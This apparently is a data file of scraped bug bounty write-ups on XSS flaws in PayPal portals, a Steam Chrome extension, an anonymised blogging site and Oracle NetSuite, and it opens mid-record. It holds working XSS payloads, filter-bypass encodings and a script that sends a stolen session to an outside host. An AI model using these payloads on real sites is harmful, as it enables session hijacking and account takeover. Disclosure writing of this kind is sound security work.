See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@YoKoKho/turning-self-xss-into-non-self-stored-xss-via-authorization-issue-at-paypal-tech-support-and-brand-3046f52ac16b", "title": "Turning Self-XSS into non-Self Stored-XSS via Authorization Issue at “PayPal Tech-Support and Brand Central Portal” | by YoKo Kho | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@YoKoKho/turning-self-xss-into-non-self-stored-xss-via-authorization-issue-at-paypal-tech-support-and-brand-3046f52ac16b. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nTurning Self-XSS into non-Self Stored-XSS via Authorization Issue at “PayPal Tech-Support and Brand Central Portal” | by YoKo Kho | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Turning Self-XSS into non-Self Stored-XSS via Authorization Issue at “PayPal Tech-Support and Brand Central Portal” YoKo Kho 11 min read · Apr 21, 2018 -- 3 Listen Share بسم الله الرحمن الرحيم Please kindly visit this simple paper directly to looking this release (for a simple look — November, 2017 Article): [English Version] PayPal — Turning Self-XSS into non-Self Stored-XSS via Authorization Issue For completing the explanation, we upload the video at Youtube for both of scenario: Stored XSS (via Malicious SVG File) at Technical Support Portal: https://youtu.be/7Au-As7jrQs Stored XSS (via File Name Injection) at Brand Central Portal: https://youtu.be/XwynfNOxIlI I. ABSTRACT As a part for delivering the technical support to all of PayPal’s merchant, PayPal providing the portal (located at: https://www.paypal-techsupport.com ) for their merchant to communicate each other with PayPal such as discussing about the integration, send a feedback about the needed new feature, or any technical issue that could be face by PayPal’s merchant). Press enter or click to view image in full size Figure 1 PayPal Technical Support Portal In other side, for completing the support to all of entities that has use PayPal in their daily activity, PayPal also providing the site that could be used specifically by their customer to asking a permission about the use of PayPal’s logo at their business (located at: https://www.paypal-brandcentral.com ). Press enter or click to view image in full size Figure 2 PayPal Brand Central Portal Both of site has been supported with the file upload feature so either merchant or customer could try to upload the permitted file that could be used by PayPal for looking the situation that faced by them each other. But the problem exists when those file upload feature has a validation issue at their content (for technical support portal) and at their file name (for brand central portal) that could allow the Attacker to be able to store a script (client side scripting) which could be used for few attack scenarios (like redirecting a user to a phishing page or even downloading a malware — which is called Cross Site Scripting — will explain later at this report). Additional Note : Previously, PayPal Brand Central Site has been open for public for registration and everyone could activate their selves with the activation link that provide by PayPal (and yes, we could bypass this activation and we will release the related simple paper in near future — you could try to test the forgot password feature first with account yk@paypal.com ). But now, every registration at this portal should be approved manually by PayPal. Press enter or click to view image in full size Figure 3 Bypassing the PayPal Activation Link at PayPal Brand Central II. INTRODUCTION 2.1. Stored Cross Site Scripting (XSS) To put it simply, this kind of vulnerability is a vulnerability that could “let” an Attacker to be able to execute a code in the input section that hasn’t implemented filtering for special characters such as “ > < : / ; etc. In contrast to Reflected XSS that doesn’t save the “script” and required the target to visit the URL that has been “injected” by “additional contents” from an Attacker, Stored XSS save this script at the database and could be execute automatically when the target visit the affected page like normal. 2.2. 0x01 — General Ticket Submission at Tech Support Portal At the TechSupport Portal, PayPal allows the users to submit their issue via “Contact Support” Feature that could be visit at https://www.paypal-techsupport.com/app/ask . Generally, there are two process that could be used to user to submit the ticket into the TechSupport portal, which are. 2.2.1. The user should login into their TechSupport Portal account and visit the mentioned URL related “Contact Support” Feature. At this condition, then the user will directly face the “Subject” column as the first thing that need to be filled. Press enter or click to view image in full size Figure 4 Contact Support After Login 2.2.2. The second one is the user just directly visit the “Contact Support” Feature without any login activity . At this condition, then the user will directly face the “ Email Address” column as the first thing that need to be filled. Press enter or click to view image in full size Figure 5 Contact Support Page without Login At those ticket submission activity, the users can upload the supported documents that could be used to explains their issue more completely. In this situation, there are specific extension of the files that could be submitted by user, which are .txt, .doc, .docx, .xls, .xlsx, .pdf, .jpg, .png, .bmp, .ppt, and .pptx. In simple, .svg file format is not allowed by system to be upload at the portal. Press enter or click to view image in full size Figure 6 .SVG in not allowed to be Upload But the problem exists when the Attacker could manipulate the process of ticket submission to conduct a client side Attack to targeted account. In this case, Attacker could use the “Ticket submission without login” process and bypassing the protection of .svg upload . Also, the best thing in this scenario is PayPal Technical Support Portal didn’t validate the content of the .svg file too so Attacker could modify the content with the client side script that they would like to inject. Here is the example of the content that we use as the PoC (will explain later): <?xml version=”1.0″ encoding=”UTF-8″ standalone=”yes”?> <svg onload=”window.location=’http://www.google.com'” xmlns=\"http://www.w3.org/2000/svg\"> </svg> Special note : Very thanks to @BruteLogic for his very cool research related this thing that could be found at: https://brutelogic.com.br/blog/file-upload-xss/ 2.3. 0x01 — Mind Map of Ticket Submission at PayPal Tech Support Portal For completing to understanding the process of ticket submission, here are the simple mind map with few little explanation that could be help: 2.3.1. The figure below shown the normal process of ticket submission at TechSupport Portal. In this case, the scenario is “ Ticket submission with Login “. Everything looks normal just like the common flow of support portal. Press enter or click to view image in full size Figure 7 Ticket Submission with Login As has been described earlier, at those part, users are allow to upload the white list extension as their supported documents. 2.3.2. And the figure below also shown the process of ticket submission at TechSupport Portal with different condition. In this case, the scenario is “ Ticket submission without Login “. So, at this part, the users should fill the email address that they would like to use to interact with the submitted ticket. Press enter or click to view image in full size Figure 8 Ticket Submission without Login After the question has been submitted, then the user itself should login into the portal to interact with their own question. III. SUMMARY OF ISSUE As it has been described before, the security problem in this report is related with a vulnerability that “allows” an Attacker to be able to “store” an injected script (client side scripting) which could be used for few attack scenarios (like redirecting a user to a phishing page or even downloading a malware). The problem exist since there is a validation issue at their content checking (for technical support portal) and at their file name (for brand central portal). This condition also supported with authorization issue at both of application . IV. PROOF OF CONCEPT The proof of concept related this one is a little tricky since basically this XSS issue was a self-XSS. For completing the explanation, we do try to give simple mind map that could explain the attack method. 4.1. 0x01 — Proof of Concept at Technical Support Portal 4.1.1. When we back into the point #2.3.2 at this report, we will realize if there is an authorization issue at this portal. In other words, any anonymous user could try to submit a ticket to the registered user at the portal. All they need just “know” the registered email ID So basically, we could use this authorization issue to create a new ticket and upload the malicious .svg file to trigger the XSS at the target. Since the kind of XSS is stored XSS, then the Attacker just need to wait until the target open the created ticket. Another interesting part is, since there is no CAPTCHA at this ticket submission feature, then the Attacker could automatically brute the email field with the list of emails that they want. (yes, there is a token that will expired in some of period, but at least we could use it). Note : Probably this method is one of the business process that has been thinking deeply by PayPal so they didn’t fix this kind of ticket submission method (All PayPal do is fixed the XSS problem). 4.1.2. At this step, we should learn the flow of the attack first before directly go to the proof of concept. The figure below shown the method that used by Attacker to tricks the victim. In this case, the Attacker should uses the process of “ Ticket submission without Login ” and “ bypass the file upload protection” to upload the malicious .svg file. Press enter or click to view image in full size Figure 9 Mind Map of Attack So, just like the flow of “ticket submission without login” part, the email address that should be fulfilled by Attacker is the existing victim’s email account at TechSupport Portal (see the point #4.1.1). 4.1.3. After everything was filled, then the next thing that Attacker should do is upload the malicious .svg file that contains the client side scripting. Here is the sample of the client script that used as a PoC purpose: <?xml version=”1.0″ encoding=”UTF-8″ standalone=”yes”?> <svg onload=”window.location=’http://www.google.com'” xmlns=\"http://www.w3.org/2000/svg\"> </svg> Please kindly note, we still need to do a bypass of the client side protection that explained previously (see the figure below), then the Attacker should change the extension of the .svg file to the allowed one such as .png. Press enter or click to view image in full size Figure 10 Restricted Files Only — .SVG File is not Allowed Press enter or click to view image in full size Figure 11 Change the Extension into the .png File Format 4.1.4. After we choose the malicious .png file that shipped with the client side script code, then the next thing is intercept the request before we send it to the server. In the interception request, then we should change the content-type and extension into the .svg file format and .svg extension Press enter or click to view image in full size Figure 12 Change the Content-Type and Extension of the File 4.1.5. After everything was setup, then forward the request. When the request has been forwarded, then we will get a success result if the .SvG extension has been uploaded. Press enter or click to view image in full size Figure 13 Success to Upload the .SvG File 4.1.6. The latest part is of course the Attacker just need to wait the victim open the ticket and opening the .svg file that has been uploaded previously by Attacker. When the .svg file is open, then the XSS will be triggered. 4.2. 0x02 — Proof of Concept at Brand Central Portal 4.2.1. Similar with the point #2.3.2 at this report, there is an authorization issue at this portal. In other words, any anonymous user could try to submit a ticket to the registered user at the portal. All they need just “know” the registered email ID. Press enter or click to view image in full size Figure 14 Normal Method of Registration : Ticket Submission at Brand Central Portal The above shown the process of registering the account at BrandCentral. In this case, there are both scenario, which is: “ If the account doesn’t exist ” and “ If the account is exist “: If the account exists, then the registering process will turn their function into the “ Ticket Submission without the knowledge of User’s Password “; If the account doesn’t exist, then the registering process will stand as normal function (which is registration). 4.2.2. At this step, we will use the same flow just like the Technical Support Portal. The figure below shown the method that used by Attacker to tricks the victim. In this case, the Attacker should use the process of “ Ticket submission without Login ” and “ upload any file name to be change later” to trigger the XSS. Press enter or click to view image in full size Figure 15 Mind Map of Attack — PayPal Brand Central So, just like the flow of “ticket submission without login” part, the email address that should be fulfilled by Attacker is the existing victim’s email account at Brand Central Portal (see the point #4.2.1). Press enter or click to view image in full size Figure 16 Uploading the File with “cmd” as the name 4.2.3. After everything was filled, then the next thing that Attacker should do before sending the request completely to server is intercepting the request to change the file name into the malicious script that we would like to trigger at the victim’s side. For a sample proof to know this issue is works or not, we could use this simple pop up alert payload: ><img src=x onerror=prompt(1)> But since this pop up alert payload is not good enough to rising the risk level of issue, then we should try to change the payload (at least to the URL Redirection or downloading a program). At this situation, we found another issue, which is, the file name at this portal was restrict from dot, quote, equal, and slash character -> . ” / = So we should try to bypass it by changing the payload into this one. <img src=a onerror=document&#46;location&#61;&#34;http:&#47;&#47;google&#46;com&#34;> And here is the final setup when we intercept the request: Press enter or click to view image in full size Figure 17 Intercepting the Request and Change the File Name 4.2.4. The latest part is of course the Attacker just need to wait the victim open the ticket. When the ticket is open, then the page will execute the script that injected at the file name. Press enter or click to view image in full size Figure 18 The Page will Execute the Script that Injected at the File Name V. RECOMMENDATION There are several recommendations that could be implemented for preventing these issues (completely): 5.1. Protecting the ticket submission process by disabling the ticket submission without login; 5.2. Checking the uploaded file not only at the client side part, but also when the request has been send into the server; 5.3. Checking the file name that uploaded into the server. VI. ADDITIONAL INFORMATION For completing the explanation, we upload the video at Youtube for both of scenario: 6.1. Stored XSS at Technical Support Portal: https://youtu.be/7Au-As7jrQs ; 6.2. Stored XSS at Brand Central Portal: https://youtu.be/XwynfNOxIlI . VII. LESSON LEARNED 7.1. Always try to find a way to triggering your self-XSS into the non-self XSS. Even the file couldn’t be access for public (just like both of this case), then find a way to triggering it to the public or at least into the targeted victim; Once more, @BruteLogic has released his very cool research related this that could be found at: https://brutelogic.com.br/blog/leveraging-self-xss/ 7.2. PayPal has rewarded the issue that reported at Technical Support Portal and decided to mark the issue at Brand Central as “Not Actionable”. The main issue at this situation is there is a lack of information that we sent to PayPal related the Brand Central (which is not with the mind map of process and mind map of Attack just like we did at the Technical Support Portal). My point of view in this case are: Since there are so much thing that should be protected, the Security Team doesn’t always know the process at each application that they have. Also, we should know if they will receive so many report from any researcher around the world. From both of those consideration, then the reporter always should create a complete report (explaining the process) or at least create the PoC video with the detail of step by step. Please kindly note, since PayPal change the registration process at Brand Central, then the issue at Brand Central is not applicable anymore. Stored Xss Bug Bounty Infosec Paypal Bug Bounty Security -- -- 3 Written by YoKo Kho 1.3K followers · 38 following Independent | OSCP, CRTO, eWPTX, eCPTX | https://twitter.com/YoKoAcc | https://bugcrowd.com/YokoKho | https://leanpub.com/bughunting101 (Bahasa) Free! Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/index.html", "title": "Steam, Fire, and Paste – A Story of UXSS via DOM-XSS & Clickjacking in Steam Inventory Helper – The Hacker Blog", "friendly_explanation": "This is a bug bounty writeup from https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/index.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSteam, Fire, and Paste – A Story of UXSS via DOM-XSS & Clickjacking in Steam Inventory Helper – The Hacker Blog The Hacker Blog FlashHTTPRequest JudasDNS XSS Hunter tarnish Home Steam, Fire, and Paste – A Story of UXSS via DOM-XSS & Clickjacking in Steam Inventory Helper June 07, 2018 Reading time ~5 minutes Home tarnish XSS Hunter JudasDNS FlashHTTPRequest | Follow @IAmMandatory Steam, Fire, and Paste – A Story of UXSS via DOM-XSS & Clickjacking in Steam Inventory Helper Summary The âSteam Inventory Helperâ Chrome extension version 1.13.6 suffered from both a DOM-based Cross-site Scripting (XSS) and a clickjacking vulnerability. By combining these vulnerabilities it is possible to gain JavaScript code execution in the highly-privileged context of the extensionâs background page. Due to the extension declaring the â â permission, this vulnerability can be exploited to hijack all sites that the victim is authenticated to. For example, if a user is authenticated to their bank, Steam, Gmail, and Facebook, this vulnerability could be used to access all of those accounts. This vulnerability is fixed in the latest version of the extension and all users should update (if Chrome has not done so for them automatically). The core of this issue is due to a DOM-based Cross-site Scripting (XSS) in â/html/bookmarks.htmlâ which is frameable from arbitrary web pages due to a the âweb_accessible_resourcesâ directive specifying this resource. By submitting an entry with the name of an XSS payload this page can be exploited to gain JavaScript execution in the context of the extension. Since a user is unlikely to paste an XSS payload into this page of their own will, the clickjacking vulnerability is used to redress the UI of the application to trick the victim into exploiting the issue. A pretext of a âBot Detectionâ page is used to get the victim to paste the payload (hidden inside of a larger âverification codeâ) and click the âAddâ button to exploit the issue. The full proof-of-concept can be seen in the video below. Proof-of-Concept Technical Details The first vulnerability is the DOM-based Cross-site Scripting (XSS) vulnerability in â/html/bookmarks.htmlâ, the following is the vulnerable JavaScript from the included âbookmarks.jsâ: $('#btAdd').click(function() { var btname = $('#txtName').val(); if ($('.custom-button .name').filter(function() { return $(this).text() === btname; }).length) return false; var span = $('<span class=\"custom-button\">'); span.html('<span class=\"name\">' + btname + '</span>'); span.append('<a href=\"javascript:void(0)\" title=\"remove\">x</a>'); span.attr('title', btname); span.data('id', (new Date().getTime())); $('div.custom-buttons .existing').append(span); save_options(); }); The above JavaScript takes the value of the âtxtNameâ text box and uses string concatenation to build HTML which is appended to the DOM via jQueryâs âappend()â function. This is the core of the XSS vulnerability since user input should always be contextually escaped to prevent injection of arbitrary markup. Normally, Chrome extension Content Security Policy (CSP) should prevent this vulnerability from being exploited. However, due to the loosening of this policy via âunsafe-evalâ and the use of jQueryâs DOM APIs, this was still able to be exploited. This is due to much of jQueryâs DOM APIs making use of âglobalEval()â , which automatically passes scripts to âeval()â upon appending to the DOM. While this is a serious vulnerability, on its own exploitation is fairly limited due to the user-interaction required to exploit it. The victim would have to open the page, paste a Cross-site Scripting (XSS) payload into the field, and click the âAddâ button to exploit it. In order to better weaponize this vulnerability we make use of a separate vulnerability (clickjacking) in order to bolster the attack. The following is an excerpt from the Chrome extensionâs manifest: ...trimmed for brevity... \"web_accessible_resources\": [ \"_locales/*\", \"bundle/*\", \"dist/*\", \"assets/*\", \"font/*\", \"html/bookmarks.html\", \"css/*.css\", \"js/*.js\", \"js/jquery/*.js\", \"js/lang/*\" ], ...trimmed for brevity... The above section demonstrates that the extension casts a wide net with its âweb_accessible_resourcesâ policy. By default Chrome extensions prevent framing and navigation to Chrome extension pages from arbitrary web pages as an extra security measure. This directive loosens this restriction, allowing for third party pages to navigate to and frame the specified resources. Much of the extensionâs privileged UI pages are specified under this directive, rendering the extension vulnerable to clickjacking. As can also be seen in the excerpt, the â/html/bookmarks.htmlâ page is also able to be framed and thus exploited via clickjacking. We abuse this to iframe this page in our web page, and overlay the frame with DOM elements to redress the layout. This makes it so that the victim is unaware that they are actually interacting with the extension below. The following animation demonstrates this effect: The above example demonstrates how we redress the UI to trick the victim. The âBot Detectionâ page provides a button to click to copy the âVerification codeâ to the victimâs clipboard. This âverification codeâ is actually a Cross-site Scripting (XSS) payload inside of a large amount of random hex bytes. This hides the payload from the victimâs view while they paste it into the extensionâs textbox, leading the victim into believing they are just copying and pasting a long random code. Finally, when the victim clicks the âAddâ button, the XSS fires. Root Cause & Further Thoughts There are two notable points of interest in this exploit. The first is that we were able to achieve DOM-XSS even with a fairly tight Content Security Policy (CSP) of the following: \"script-src 'self' 'unsafe-eval'; object-src 'self'\" While this CSP is fairly strong, it crumbles when combined with unsafe usage of jQueryâs DOM manipulation APIs such as â.html()â and â.append()â. This is something to look for when auditing Chrome extensions (and when writing them), if you make use of jQuery and have âunsafe-evalâ in your CSP â youâre playing with fire. The second interesting point is that clickjacking is a valid vulnerability which can absolutely affect Chrome extensions. All that is required is that a privileged Chrome extension UI page be exposed via the âweb_accessible_resourcesâ directive. After taking a look at many of the popular extensions on the Chrome store it seems many of them fall victim this simple mistake. Most of the time this is due to accidental overscoping via wildcarding of a privileged extension HTML page. This not only opens up extensions to attacks like clickjacking but can result in other vulnerabilities if the extension takes in user input from âlocation.hashâ, âpostMessageâ, etc. The default protection given to Chrome extensions via the navigation sandboxing should not be taken for granted by the extension developers. Timeline June 4: Disclosed to SIH TechSupport (owners of extension) June 6: Vendor confirms receipt of issue, states they will look into it and fix it. June 7: Vendor updates extension to fix the vulnerabilities. chrome extension csp bypass chrome extension hijacking csp jquery unsafe-inline jquery uxss chrome xss chrome extension Matthew Bryant (mandatory) Like Tweet +1 About the Author Matthew Bryant (mandatory) Security researcher who needs to sleep more. Opinions expressed are solely my own and do not express the views or opinions of my employer. Follow @mandatoryprogrammer Follow @IAmMandatory Read More \"Zero-Days\" Without Incident - Compromising Angular via Expired npm Publisher Email Domains **NOTE:** *If you're just looking for the high level points, see the\"[The TL;DR Summary & High-LevelPoints](#the-tldr-summary--high-level...… Continue reading Video Downloader and Video Downloader Plus Chrome Extension Hijack Exploit - UXSS via CSP Bypass (~15.5 Million Affected) Published on February 22, 2019 Kicking the Rims – A Guide for Securely Writing and Auditing Chrome Extensions Published on June 12, 2018 © 2022 Matthew Bryant (mandatory). Powered by Jekyll using the Neo-HPSTR Theme ."}
{"source_url": "https://medium.com/@yassergersy/xss-to-session-hijack-6039e11e6a81", "title": "Stealing HttpOnly Cookie via XSS. Hi | by Yasser Gersy | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@yassergersy/xss-to-session-hijack-6039e11e6a81. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nStealing HttpOnly Cookie via XSS. Hi | by Yasser Gersy | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Stealing HttpOnly Cookie via XSS Yasser Gersy 5 min read · Apr 8, 2018 -- 9 Listen Share Hi It’s very rarely that i write about my findings , But i decided to share this which may help you while writing pocs. First to be honest i’m one of the laziest hackers , i run my own scripts and common tools like wfuzz, sublister , nmap , etc and watch a random movie after the movie is finished i remember those who are running. I was fuzzing for common directories on a private website let’me call it jerico.com. jerico.com is a popular platform for blogging and it has more than 500 Million users. As usual , i ran Wfuzz with a wordlist wfuzz -c -z file,/root/Desktop/common-list --hc 404,400,302 https://jerico.com/FUZZ I was surprised to see the server returned 200 OK for the following end-point /account/settings/server When i requested this end-point in my browser , i was seeing my own account settings , i tried to view the source code of the website and concluded that the ‘server’ string was returned inside a script tag; <script> var user = ‘server’; </script> of course a very simple payload would be : '-alert(2)-' so the full url would be : https://jerico.com/account/settings/server‘-alert(2)-’ Boom , this is a very simple XSS,lucky ! :D Report Hi Team I found an xss at https://jerico.com/account/settings/server‘-alert(2)-’ happy fixing. Yes , i love reporting very simple issues without further investigating , but this time the team was unresponsive so i decided to get some attentions . One of the interesting points for me is the login . From my previous investigation , i found the login end-point was returning session cookie in the set-cookie Header in Response body If you tried to log in POST /Account/Login HTTP/1.1 HOST: jerico.com user[email]=fo@bar.com&user[password]=qwerty The response would be : HTTP/1.1 200 OK Set-Cookie:session=xz4z5cxz4c56zx4c6x5zc46z5xczx46cx4zc6xz4czxc; secure;httpOnly;domain=jersico.com {\"session\":\"xz4z5cxz4c56zx4c6x5zc46z5xczx46cx4zc6xz4czxc\"} The session cookie is marked as httpOnly So javascript would not access it But the session is returned in response body , Javascript would not access the cookie but it can access the response body and get the protected cookie . So to get the cookie , you need to issue a post request as login .and fetch the response body: POST /Account/Login HTTP/1.1 HOST: jerico.com ْX-Requested-With: XMLHttpRequest user[email]=fo@bar.com&user[password]=qwerty Are you kidding ? how would you get the email and password. I tried to issue a csrf request to the login end-point without any body parameters POST /Account/Login HTTP/1.1 Cookie: session=xz4z5cxz4c56zx4c6x5zc46z5xczx46cx4zc6xz4czxc; HOST: jerico.com And wow ! I was lucky the server was returning the same data in response body: HTTP/1.1 200 OK Set-Cookie:session=xz4z5cxz4c56zx4c6x5zc46z5xczx46cx4zc6xz4czxc; secure;httpOnly;domain=jersico.com {\"session\":\"xz4z5cxz4c56zx4c6x5zc46z5xczx46cx4zc6xz4czxc\"} Yeah ,The plan goes well. Issue an XHR request to login end-point Server returns sesssion id in response body Fetch the body and steal the session. here is the complete JS code to steal the cookie <script> var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() { if (xhr.readyState == 4) { prompt('You are hacked , your session='+xhr.response);} document.location.replace('//yassergersy.com/stealer?data='+xhr.response'); } xhr.open('POST', '/account/login',true); xhr.withCredentials = true; xhr.send(null); </script> Encoding and sending the payload failed :( , most special characters were filtered : \",<>/\\ For me the following characters were enough to achieve my goal : '()-. We need to convert all special characters to String.fromCharCode(ascii) for a space = 32 String.fromCharCode(32) for a comma = 44 String.fromCharCode(44) so for alert(1337) the payload would be : eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 51, 51, 55, 41 )) Hold on , the , comma was filtered , the payload again will fail , we need another trick ,my jascript skills are not so good I tried to search google for javascript string concatenation And found concat() https://www.w3schools.com/jsref/jsref_concat_string.asp So instead of separating chars we can concatenate them using .concat() for example if we need to pass a,b we can concatenate b with a using: 'a’.concat('b') Of course this trick will not be used for alphabetical chars, it will be used for the special characters which the application sanitizes like \"<>/\\, So using concat and String.fromCharCode we can execute whatever JS code i decided to test the following payload <script> document.location.replace(\"//evil.net\"); </script> This was too boring to do it manually so i decided to write a python script to make it easier : https://gist.github.com/YasserGersy/a0fee5ce7422a558c84bfd7790d8a082 saving the payload to a file named payload.txt and executing the following command python Js2S.py payload.txt Resulted in generating : ''.concat(String.fromCharCode(60)).concat('script').concat(String.fromCharCode(62)).concat(String.fromCharCode(10)).concat('document').concat(String.fromCharCode(46)).concat('location').concat(String.fromCharCode(46)).concat('replace').concat(String.fromCharCode(40)).concat(String.fromCharCode(34)).concat(String.fromCharCode(47)).concat(String.fromCharCode(47)).concat('evil').concat(String.fromCharCode(46)).concat('net').concat(String.fromCharCode(34)).concat(String.fromCharCode(41)).concat(String.fromCharCode(59)).concat(String.fromCharCode(10)).concat(String.fromCharCode(60)).concat(String.fromCharCode(47)).concat('script').concat(String.fromCharCode(62)).concat(String.fromCharCode(10)) This generated payload is considered as a single string and would not be filtered by the application , so we can pass it to eval and execute it in his case i needed this payload to be written in the document. So that i will use document.write(my_payload) instead of eval Anyone can use whatever function. so our final payload would be : https://jerico.com/Account/Settings/server`-dcument.write( <<generated-payload-by-python-script>>)'- Succeeded :D , let’s try a real world payload : $cat myrealworldpayload.txt . <script> var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() { if (xhr.readyState == 4) {prompt('You are hacked , your session='+xhr.response);}} xhr.open('POST', '/account/login', true); xhr.send(null); </script> And python script generated the following : python Js2S.py myrealworldpayload.txt Output > ''.concat(String.fromCharCode(60)).concat('script').concat(String.fromCharCode(62)).concat(String.fromCharCode(10)).concat('var').concat(String.fromCharCode(32)).concat('xhr').concat(String.fromCharCode(32)).concat(String.fromCharCode(61)).concat(String.fromCharCode(32)).concat('new').concat(String.fromCharCode(32)).concat(String.fromCharCode(88)).concat('MLHttpRequest').concat(String.fromCharCode(40)).concat(String.fromCharCode(41)).concat(String.fromCharCode(59)).concat(String.fromCharCode(10)).concat('xhr').concat(String.fromCharCode(46)).concat('onreadystatechange').concat(String.fromCharCode(32)).concat(String.fromCharCode(61)).concat(String.fromCharCode(32)).concat('function').concat(String.fromCharCode(40)).concat(String.fromCharCode(41)).concat(String.fromCharCode(32)).concat(String.fromCharCode(123)).concat(String.fromCharCode(32)).concat('if').concat(String.fromCharCode(32)).concat(String.fromCharCode(40)).concat('xhr').concat(String.fromCharCode(46)).concat('readyState').concat(String.fromCharCode(32)).concat(String.fromCharCode(61)).concat(String.fromCharCode(61)).concat(String.fromCharCode(32)).concat('4').concat(String.fromCharCode(41)).concat(String.fromCharCode(10)).concat(String.fromCharCode(32)).concat(String.fromCharCode(123)).concat('prompt').concat(String.fromCharCode(40)).concat(String.fromCharCode(39)).concat(String.fromCharCode(89)).concat('ou').concat(String.fromCharCode(32)).concat('are').concat(String.fromCharCode(32)).concat('hacked').concat(String.fromCharCode(32)).concat(String.fromCharCode(44)).concat(String.fromCharCode(32)).concat('your').concat(String.fromCharCode(32)).concat('session').concat(String.fromCharCode(61)).concat(String.fromCharCode(39)).concat(String.fromCharCode(43)).concat('xhr').concat(String.fromCharCode(46)).concat('response').concat(String.fromCharCode(41)).concat(String.fromCharCode(59)).concat(String.fromCharCode(125)).concat(String.fromCharCode(125)).concat(String.fromCharCode(10)).concat('xhr').concat(String.fromCharCode(46)).concat('open').concat(String.fromCharCode(40)).concat(String.fromCharCode(39)).concat('POST').concat(String.fromCharCode(39)).concat(String.fromCharCode(44)).concat(String.fromCharCode(32)).concat(String.fromCharCode(39)).concat(String.fromCharCode(47)).concat('account').concat(String.fromCharCode(47)).concat('login').concat(String.fromCharCode(39)).concat(String.fromCharCode(44)).concat(String.fromCharCode(32)).concat('true').concat(String.fromCharCode(41)).concat(String.fromCharCode(59)).concat(String.fromCharCode(10)).concat('xhr').concat(String.fromCharCode(46)).concat('send').concat(String.fromCharCode(40)).concat('null').concat(String.fromCharCode(41)).concat(String.fromCharCode(59)).concat(String.fromCharCode(10)).concat(String.fromCharCode(60)).concat(String.fromCharCode(47)).concat('script').concat(String.fromCharCode(62)).concat(String.fromCharCode(10)) Now replace the xxxxxxxxxxxxxx in the following url with the generated payload : https://jerico.com/Account/Settings/server`-dcument.write( <<xxxxxxxxxxxxx>>)'- The payload was too long and so the url , but does not matter it works : And i was able to steal the cookie. Press enter or click to view image in full size Cookie leaked to attacker’s site Conclusion : What my real poc which i sent to the team does ? The payload first get’s echoed inside a script tag. The payload executes first as a mathematical operation since i used ‘- as subtraction operation , which first will add the full malicious payload to the document to be executed without filtration. The malicious payload executes and issues a POST request and fetches the response to extract the session id and sends it to attacker website http://yassergersy.com which later will prompt it as in the above image. The attacker website receives the stolen session id and log it. To learn: Think in the box :D Chain bugs for higher impact. Never stop searching Timeline 4–2–2018 Reported 5–2–2018 Triaged The bounty was frustrating :( Regards JavaScript Xss Attack Bug Bounty Hackerone -- -- 9 Written by Yasser Gersy 550 followers · 86 following https://twitter.com/yassergersy https://hackerone.com/exception Responses ( 9 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/bug-bounty-hunting/how-i-found-a-surprising-xss-vulnerability-on-oracle-netsuite-2d48b7fcf0c8", "title": "How I found A Surprising XSS Vulnerability on Oracle NetSuite ? | by Ronnie Joseph | Bug Bounty Hunting | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/bug-bounty-hunting/how-i-found-a-surprising-xss-vulnerability-on-oracle-netsuite-2d48b7fcf0c8. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow I found A Surprising XSS Vulnerability on Oracle NetSuite ? | by Ronnie Joseph | Bug Bounty Hunting | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Bug Bounty Hunting · Learn bug bounty hunting and other hacking tips from bug bounty hunters and security researchers around the world. White hat hacking to make legal money and read public security writeups and bug bounty stories for free! How I found A Surprising XSS Vulnerability on Oracle NetSuite ? Ronnie Joseph 2 min read · Mar 2, 2018 -- 3 Listen Share I was going around hunting and penetrating websites trying to get a few more bucks to save in my pocket which I later use to pay my college fees when I came across this wonderful vulnerability in Oracle Netsuite. Most sites actually try to secure the search bar more as they are well aware that it is always the target of attackers for finding reflected xss. I simply starting using the search bar of netsuite typing simple payloads. That’s when I remembered a type of reflected xss vulnerabilty using access keys. In my case if the victim pressed alt+shift+X , the XSS will fire. The vulnerable link was something like this — http://search.netsuite.com/socialsearch/query?cc=www&cn=netsuite&attrFilter= xlmav%22accesskey%3d%22x%22onclick%3d%22alert(document.domain)%22%2f%2fwzraf &q=k+hj+jh+j&submit= Now when the victim recieves the link and does a simple alt+shift+X ; xss gets triggered at search.netsuite.com (WOHOOO!) The security team was very fast to mitigate the issue and immediately removed the search functionality . The bug was fixed within a week. But I wonder why they asked me to delete the unlisted video POC ? Were they afraid of bug getting disclosed? God knows! Happy that the issue is resolved now. We need pudding after dinner;so is the case where we need POC for each bug. So here I am giving the unlisted video POC for all enthusiasts. PLese don’t forget to clap the story and follow me on twitter. https://twitter.com/CircleNinja PS- Please comment if you need to become a writer for this publication and I will add you. Say me HI at circleninja@protonmail.com THANKS A LOT for stopping by! Startup Cybersecurity Hacking Bug Bounty -- -- 3 Published in Bug Bounty Hunting 5.6K followers · Last published Mar 11, 2025 Learn bug bounty hunting and other hacking tips from bug bounty hunters and security researchers around the world. White hat hacking to make legal money and read public security writeups and bug bounty stories for free! Written by Ronnie Joseph 2K followers · 450 following Information Security Engineer Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
